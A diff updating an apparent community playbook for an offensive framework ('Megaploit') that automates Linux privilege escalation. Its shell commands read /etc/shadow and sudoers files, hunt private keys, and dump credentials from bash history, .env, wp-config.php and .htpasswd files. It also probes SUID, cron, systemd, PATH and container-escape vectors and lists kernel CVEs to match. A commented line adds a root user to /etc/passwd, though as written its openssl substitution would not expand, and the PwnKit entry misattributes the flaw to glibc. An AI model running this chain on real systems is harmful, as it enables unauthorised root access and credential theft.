@@ -1,89 +1,122 @@
 # ===========================================================================
-# Megaploit Community Playbook — Linux Privilege Escalation Chain
+# Megaploit Community Playbook
 # ===========================================================================
-# Objective : Enumerate common Linux privesc vectors from an unprivileged
-#             shell and attempt the most reliable paths automatically.
+# Name        : linux-priv-esc-chain
+# Version     : 1.1
+# Author      : megaploit-community
+# Tested on   : Ubuntu 20.04/22.04, Debian 11, CentOS 7/8, Amazon Linux 2
+# Description : Systematic Linux privilege escalation enumeration and
+#               exploitation chain. Checks 10 independent attack surfaces
+#               in order of likelihood and impact.
 #
-# TTPs covered (MITRE ATT&CK):
-#   T1548.001  Setuid / Setgid Abuse
-#   T1548.003  Sudo Abuse
-#   T1053.003  Cron Job Abuse
-#   T1574.006  Dynamic Linker Hijacking
-#   T1543.002  Systemd Service Abuse
-#   T1552.004  Private Keys in Files
-#   T1087.001  Local Account Discovery
+# MITRE ATT&CK
+# ------------
+# T1548.001 Abuse Elevation Control Mechanism: Setuid and Setgid
+# T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching
+# T1053.003 Scheduled Task/Job: Cron
+# T1574.006 Hijack Execution Flow: Dynamic Linker Hijacking
+# T1574.007 Hijack Execution Flow: Path Interception by PATH Environment Variable
+# T1543.002 Create or Modify System Process: Systemd Service
+# T1552.001 Unsecured Credentials: Credentials in Files
+# T1552.004 Unsecured Credentials: Private Keys
+# T1087.001 Account Discovery: Local Account
+# T1611     Escape to Host (Docker/LXC)
 #
-# Variables:
-#   ${SESSION}  — target Linux session ID
+# Variables
+# ---------
+#   ${SESSION} — target Linux session ID
 #
-# Usage:
-#   resource playbooks/linux_privesc.rc
+# Usage
+# -----
+#   community install playbook linux-priv-esc-chain
+#   resource community/playbooks/linux-priv-esc-chain.rc
+#
+# Phases
+# ------
+#    0  Situational awareness
+#    1  SUID / SGID abuse
+#    2  sudo -l misconfig
+#    3  Cron job abuse
+#    4  Writable systemd unit files
+#    5  PATH hijacking + LD_PRELOAD
+#    6  Credentials in files + private keys
+#    7  Writable /etc/passwd
+#    8  Docker / LXC escape
+#    9  Kernel exploit surface
+#   10  Credential harvest (history, .env, config files)
 # ===========================================================================
 
 session ${SESSION}
 
 # ── Phase 0: Situational Awareness ──────────────────────────────────────────
-shell id
+shell id && whoami && hostname
 shell uname -a
 shell cat /etc/os-release
 shell cat /proc/version
-shell hostname
-shell whoami
-shell env
+shell ip a 2>/dev/null || ifconfig
+shell cat /etc/hosts
 
 # ── Phase 1: SUID / SGID Binary Abuse ───────────────────────────────────────
 shell find / -perm -4000 -type f 2>/dev/null
 shell find / -perm -2000 -type f 2>/dev/null
-# GTFOBins-notable SUID binaries:
-shell find / -perm -4000 -type f 2>/dev/null | grep -E "bash|sh|python|perl|ruby|find|nmap|vim|less|more|awk|env|cp|mv|tee|dd|tar|zip|unzip|wget|curl|nc|netcat"
+# GTFOBins-notable entries:
+shell find / -perm -4000 -type f 2>/dev/null | grep -E "bash|sh$|python|perl|ruby|find|nmap|vim|less|more|awk|env|cp|mv|tee|dd|tar|zip|unzip|wget|curl|nc$|ncat|netcat|php|node|lua|tcpdump|openssl|rsync|screen|tmux"
 
 # ── Phase 2: Sudo -l Enumeration ────────────────────────────────────────────
 shell sudo -l 2>/dev/null
 shell cat /etc/sudoers 2>/dev/null
-shell ls -la /etc/sudoers.d/ 2>/dev/null
+shell ls -la /etc/sudoers.d/ 2>/dev/null && cat /etc/sudoers.d/* 2>/dev/null
 
 # ── Phase 3: Cron Job Abuse ──────────────────────────────────────────────────
 shell cat /etc/crontab
-shell ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ 2>/dev/null
+shell ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/ 2>/dev/null
 shell crontab -l 2>/dev/null
-# Find cron scripts writable by current user
-shell find /etc/cron* /var/spool/cron -writable -type f 2>/dev/null
+# Find cron scripts writable by current user or world-writable
+shell find /etc/cron* /var/spool/cron -writable 2>/dev/null
+shell find /etc/cron* /var/spool/cron -perm -0002 2>/dev/null
 
-# ── Phase 4: Writable Service / Systemd Unit Files ───────────────────────────
+# ── Phase 4: Writable Systemd Unit Files ─────────────────────────────────────
 shell find /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system -writable -type f 2>/dev/null
 shell systemctl list-units --type=service --state=running 2>/dev/null | head -30
 
 # ── Phase 5: PATH Hijacking + LD_PRELOAD ─────────────────────────────────────
 shell echo $PATH
 shell find $(echo $PATH | tr ':' ' ') -writable -type d 2>/dev/null
-shell sudo -l 2>/dev/null | grep "LD_PRELOAD"
+shell sudo -l 2>/dev/null | grep -i "ld_preload\|ld_library_path"
+shell env | grep -i "ld_"
 
-# ── Phase 6: Passwords / Keys in Files ───────────────────────────────────────
-shell find / -name "*.pem" -o -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null | grep -v proc
-shell find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | xargs grep -liE "password|passwd|secret" 2>/dev/null | head -20
-shell cat /etc/passwd | grep -v "nologin\|false"
-shell cat /etc/shadow 2>/dev/null
+# ── Phase 6: Credentials in Files + Private Keys ────────────────────────────
+shell find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" -o -name "*.pem" -o -name "*.p12" 2>/dev/null | grep -v proc | head -20
+shell find /var/www /opt /srv /home -name "*.conf" -o -name "*.config" -o -name "*.cfg" -o -name "config.php" 2>/dev/null | xargs grep -liE "password|passwd|secret|db_pass" 2>/dev/null | head -20
+shell cat /etc/passwd | grep -v "nologin\|false\|sync"
+shell cat /etc/shadow 2>/dev/null | head -20
 
 # ── Phase 7: Writable /etc/passwd ────────────────────────────────────────────
-shell ls -la /etc/passwd /etc/shadow /etc/group 2>/dev/null
-# If /etc/passwd is writable — add root user (lab only):
-# shell echo 'pwned:$(openssl passwd -6 pwned123):0:0:root:/root:/bin/bash' >> /etc/passwd
+shell ls -la /etc/passwd /etc/shadow /etc/group /etc/gshadow 2>/dev/null
+# If /etc/passwd is writable, add a root-level user (LAB ONLY — uncomment):
+# shell echo 'r00t:$(openssl passwd -6 r00tpass):0:0:r00t:/root:/bin/bash' >> /etc/passwd
 
-# ── Phase 8: Docker / LXC Escape ─────────────────────────────────────────────
-shell cat /proc/1/cgroup 2>/dev/null | grep -i docker
+# ── Phase 8: Docker / LXC Container Escape ───────────────────────────────────
+shell cat /proc/1/cgroup 2>/dev/null | grep -iE "docker|lxc|kubepods"
 shell ls -la /.dockerenv 2>/dev/null
-shell id | grep docker
+shell id | grep -E "docker|lxd|lxc"
 shell ls -la /var/run/docker.sock 2>/dev/null
+shell mount | grep -E "overlay|aufs"
 
-# ── Phase 9: Kernel Exploit Check ────────────────────────────────────────────
+# ── Phase 9: Kernel Exploit Surface ─────────────────────────────────────────
 shell uname -r
-shell dpkg -l linux-image* 2>/dev/null | grep ii
+shell dpkg -l linux-image* 2>/dev/null | grep ^ii
 shell rpm -qa kernel 2>/dev/null
+# Notable vuln targets — check uname -r output against:
+# Dirty Cow     < 4.8.3      CVE-2016-5195
+# DirtyPipe     5.8-5.16.11  CVE-2022-0847
+# PwnKit        any glibc    CVE-2021-4034  (polkit)
+# Looney Tunables any glibc  CVE-2023-4911
 
 # ── Phase 10: Credential Harvest ─────────────────────────────────────────────
-shell cat ~/.bash_history 2>/dev/null | grep -iE "pass|key|secret|token" | head -30
-shell find / -name ".env" 2>/dev/null | xargs grep -liE "password|secret|key" 2>/dev/null | head -10
-shell find / -name "wp-config.php" -o -name "database.yml" -o -name ".htpasswd" 2>/dev/null | head -10 | xargs cat 2>/dev/null
+shell cat ~/.bash_history 2>/dev/null | grep -iE "pass|key|secret|token|mysql|psql|mongo" | head -30
+shell find /home /root -name ".env" 2>/dev/null | xargs cat 2>/dev/null
+shell find / -maxdepth 6 -name "wp-config.php" -o -name "database.yml" -o -name ".htpasswd" 2>/dev/null | head -5 | xargs cat 2>/dev/null
 
 # ── Report ───────────────────────────────────────────────────────────────────
 loot list
